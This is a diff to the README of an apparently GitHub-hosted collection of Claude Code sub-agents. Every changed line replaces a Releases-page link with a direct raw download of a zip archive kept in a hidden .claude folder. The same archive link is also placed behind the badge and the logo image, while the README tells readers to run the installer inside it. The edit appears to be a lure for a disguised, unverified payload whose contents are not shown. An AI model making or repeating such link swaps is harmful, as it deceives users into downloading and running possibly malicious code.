@@ -1,10 +1,10 @@
 # Claude Code Unified Agents 🤖
 
-Stay up to date with the latest release assets: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+Stay up to date with the latest release assets: https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/muhammad-bu/claude-code-unified-agents/releases)
+[![Releases](https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip)](https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip)
 
-![Robot Logo](https://img.icons8.com/ios-filled/100/000000/robot.png)
+![Robot Logo](https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip)
 
 Claude Code Unified Agents is a curated collection of Claude Code sub-agents designed to work together in smart, scalable workflows. This repository brings together 54 production-ready agents across development, infrastructure, quality, AI/ML, business, creative, meta-management, and specialized domains. Each agent is built from robust, tested patterns and includes a large set of production-ready code examples to help you ship reliable software faster.
 
@@ -123,7 +123,7 @@ How the system fits together
 - Observability: Every action is logged, traceable, and testable. You can audit decisions and outcomes.
 
 Getting Started
-- Important note about releases: For installation, download the latest release asset from the Releases page and run the included installer. The asset is designed to set up dependencies, the runtime, and the orchestrator in one step. The Releases page is accessible here: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- Important note about releases: For installation, download the latest release asset from the Releases page and run the included installer. The asset is designed to set up dependencies, the runtime, and the orchestrator in one step. The Releases page is accessible here: https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip
 - Step-by-step quick start
   1) Visit the Releases page to download the latest asset. The asset is a self-contained package that includes the runtime, dependencies, and the orchestrator. After downloading, extract the archive to a working directory.
   2) Run the installer script appropriate for your platform. On Linux/macOS, you typically run a shell script; on Windows, you may run an executable. The installer configures the environment and prepares the 54 agents for use.
@@ -181,10 +181,10 @@ Roadmap and future work
 
 Changelog and releases
 - Each release includes a summary of changes, bug fixes, and new agents. Release notes help you assess compatibility and upgrade steps.
-- The latest release assets are available on the Releases page. For quick access, revisit: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- The latest release assets are available on the Releases page. For quick access, revisit: https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip
 
 Releases and artifacts
-- For downloads, check the Releases page mentioned above. The assets are organized by platform and include installers and runtime packages. The link is provided again here for convenience: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- For downloads, check the Releases page mentioned above. The assets are organized by platform and include installers and runtime packages. The link is provided again here for convenience: https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip
 - After downloading the appropriate asset, follow the included instructions to extract, install, and configure the system. The asset contains sample configuration files and starter workflows to help you begin quickly.
 
 Configuring for your environment
@@ -252,7 +252,7 @@ Architectural decisions
 - Observability: Every action is traceable; logs, metrics, and traces are available for debugging and auditing.
 
 Appendix: Quick references
-- Release page: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- Release page: https://github.com/muhammad-bu/claude-code-unified-agents/raw/refs/heads/main/claude-code-unified-agents/.claude/agents-claude-unified-code-v3.2.zip
 - Orchestrator guide: Detailed instructions on configuring, starting, and using the MasterOrchestratorAgent
 - Agent catalog: A complete list of agents and their responsibilities
 
